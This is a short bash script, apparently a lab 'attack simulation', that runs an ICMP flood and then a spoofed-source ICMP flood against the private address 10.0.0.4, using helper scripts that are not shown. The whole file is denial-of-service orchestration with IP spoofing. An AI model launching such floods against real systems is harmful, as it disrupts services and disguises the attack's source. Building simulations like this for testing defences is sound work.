#!/bin/bash

TARGET=10.0.0.4
SPOOF_SOURCE=10.0.0.99

echo "======================================="
echo " Multi-Stage Attack Simulation"
echo "======================================="

echo "[Stage 1] Starting ICMP Flood..."
./attack_hping3.sh $TARGET 500 &
HPING_PID=$!

sleep 3

echo "[Stage 2] Starting Spoofed ICMP Flood..."
python3 attack_scapy.py $TARGET 300 0.01 $SPOOF_SOURCE

echo "Waiting for ICMP Flood to finish..."
wait $HPING_PID

echo "Multi-Stage Attack Finished"
